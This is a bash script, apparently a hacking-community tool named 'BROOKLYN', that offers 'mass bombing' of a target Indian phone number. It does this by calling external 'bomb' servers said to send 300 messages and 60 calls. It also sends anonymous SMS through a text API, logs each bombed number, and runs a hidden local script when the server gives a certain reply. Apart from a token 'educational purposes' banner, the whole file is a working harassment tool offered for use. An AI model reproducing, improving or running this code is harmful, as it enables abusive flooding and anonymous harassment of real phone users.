#!/bin/bash

#------------------------------------------------------#
#                   BROOKLYN    1.0 !                  #
#               Coded by Alex Bieber                   #
#~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ #
#      Github     :   github.com/alexbieber            #
#     Instagram  :  instagram.com/alexbieber1234       #
#------------------------------------------------------#
#               HAPPY HACKING    🔴🔴🔴🔴            #
#------------------------------------------------------#

# Colors FG

RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

apt-get install -y git curl wget pv espeak

clear
clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
}


banner() {

echo -e ""
echo "          $WHITE BROOKLYN
echo "          $RED            IS 
echo "          $WHITE              MY
echo "          $RED                   LIFELINE
echo "          $WHITE                          MY
echo "          $WHITE                             PIPELINE 🔴🔴🔴🔴✔
echo ""
sleep 1
echo "                                    $WHITE Author:$RED alexbieber"
echo ""

}

#    Check Internet
wget -q --spider https://github.com/alexbieber

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi



updatee() {
clear
echo -e "\e[92m "
clear
echo ""
echo "       $CYAN█░█ █▀█ █▀▄ ▄▀█ ▀█▀ █ █▄░█ █▀▀   █▀ █▀▀ █▀█ █ █▀█ ▀█▀"
echo "       $WHITE█▄█ █▀▀ █▄▀ █▀█ ░█░ █ █░▀█ █▄█   ▄█ █▄▄ █▀▄ █ █▀▀ ░█░"
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
cd ..
rm -rf BROOKLYN
git clone https://github.com/alexbieber/BROOKLYN > /dev/null 2>&1
cd brooklyn
chmod +x brooklyn.sh
clear
echo ""
echo "       $GREEN █▀ █▀▀ █▀█ █ █▀█ ▀█▀   █░█ █▀█ █▀▄ ▄▀█ ▀█▀ █▀▀ █▀▄"
echo "       $WHITE ▄█ █▄▄ █▀▄ █ █▀▀ ░█░   █▄█ █▀▀ █▄▀ █▀█ ░█░ ██▄ █▄▀ "
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting brooklyn !\e[93m"
sleep 2
bash brooklyn.sh
}


bombrecord() {
clear
echo ""
echo "$WHITE       █▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ 　  █▀▀█ █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀▄ "
echo "$GREEN       █▀▀▄ █░░█ █░▀░█ █▀▀▄ 　  █▄▄▀ █▀▀ █░░ █░░█ █▄▄▀ █░░█ "
echo "$WHITE       █▄▄█ ▀▀▀▀ ▀   ▀ ▀▀▀  　  █  █ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀▀▀ "
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}


about() {
clear
echo -e """
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92m4NU8H4V\e[1;97m█████\e[1;91m║
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
""" | pv -qL 300
sleep 1.2
echo -e "                                  This is\e[1;0m 𝗔lex Bieber" | pv -qL 150
echo "                                    aka alexbieber !" | pv -qL 150
echo ""
echo -e "     $GREEN  Ethical Hacker$WHITE |$GREEN CyberSec Enthusiast$WHITE |$GREEN Programmer" | pv -qL 10
echo ""
printf "\e[0m\e[92m                 Group Admin at$WHITE DeepWeb Shadows\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA          My social handles are below !!" | pv -qL 10
echo ""
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/alexbieber\e[0m\n" | pv -qL 50
echo ""
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/alexbieber\e[0m\n" | pv -qL 50
echo ""
echo -e "\e[1;91m                        Happy Hacking :)" | pv -qL 10
sleep 7
menux
}

eexec() {
echo "Under construction"
exit
}
menu() {
bombsrvr=$(shuf -n 1 -e https://xlr71.herokuapp.com/bomb https://xlr72.herokuapp.com/bomb https://xlr73.herokuapp.com/bomb https://xlr74.herokuapp.com/bomb https://xlr75.herokuapp.com/bomb https://xlr76.herokuapp.com/bomb)
clear
echo ""
echo "          $WHITE█▀▄▀█ ▄▀█ █▀ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "          $RED█░▀░█ █▀█ ▄█ ▄█   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "             \e[1;92m[\e[0m brooklyn\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
curl -s "$bombsrvr/$targett" > .output.txt
output=$(cat .output.txt | grep "Fuck you")
if [[ $output = "Fuck you" ]]
then
bash .loveyou3000.sh
exit
fi
output=$(cat .output.txt | grep "You can only bomb a number 5 times in a day")
if [[ $output = "You can only bomb a number 5 times in a day" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Bomb Limit Exceeded\e[1;91m ( ͡❛ ︹ ͡❛)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m You can only bomb a number 6 times a day !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Number contains non-numeric characters")
if [[ $output = "Number contains non-numeric characters" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Given number contains non-numeric characters !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Please provide 10 digit number")
if [[ $output = "Please provide 10 digit number" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Length of the given number is not 10 !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Bombing Started")
if [[ $output = "Bombing Started" ]]
then
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  $RED                     ░░░░░░███████ ]▄▄▄▄▄▄▄▄▃\n"
printf "  $WHITE                      ▂▄▅███\e[1;31mbrooklyn\e[1;0m███▅▄▃▂\n"
printf "  $RED                    I███████████████████]\n"
printf "  $WHITE                      ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m It will automatically stop after 5 min\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 300 msgs and 60 calls !!\e[93m"
echo ""
echo ""
sleep 300
printf "          \e[0m\e[41m♡ 300 msgs and 60 calls Bombed Successfully ♡\e[0m\n"
echo ""
exit
else
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Something went wrong\e[1;91m (╥﹏╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m There are some server side issues !\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m I'll fix this issue ASAP !!\e[93m"
echo ""
exit
fi
}


anonmsg(){
clear
echo ""

echo "     $RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "     $WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "      \e[1;92m[\e[0m brooklyn\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
printf "      \e[1;92m[\e[0m brooklyn\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m"
read text
echo ""

curl -X POST https://textbelt.com/text \
       --data-urlencode phone='91$smstarget' \
       --data-urlencode message='$text' \
       -d key=textbelt -s > records.txt

value=$( grep -o "true" records.txt)

if [[ $value = "true" ]]
then
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 ! $RED(╥﹏╥)\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
exit
fi
}


menux() {
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool is only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m ANONYMOUS MSG \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 5\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi
if [ "$options" -eq "4" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "5" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using brooklyn !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux
